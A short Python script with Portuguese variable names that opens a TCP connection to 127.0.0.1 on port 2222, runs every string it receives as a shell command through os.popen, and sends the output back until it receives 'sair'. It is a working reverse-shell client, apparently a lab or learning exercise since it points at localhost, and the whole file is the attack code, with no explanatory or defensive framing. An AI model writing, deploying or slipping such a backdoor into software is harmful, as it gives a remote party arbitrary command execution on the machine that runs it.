from socket import *
import os


cliente = socket(AF_INET,SOCK_STREAM)
cliente.connect(("127.0.0.1",2222))


while True:
    dados = cliente.recv(2048).decode()
    if dados == "sair":
        cliente.close()
        break
    resultado = os.popen(dados).read()
    cliente.sendall(resultado.encode())



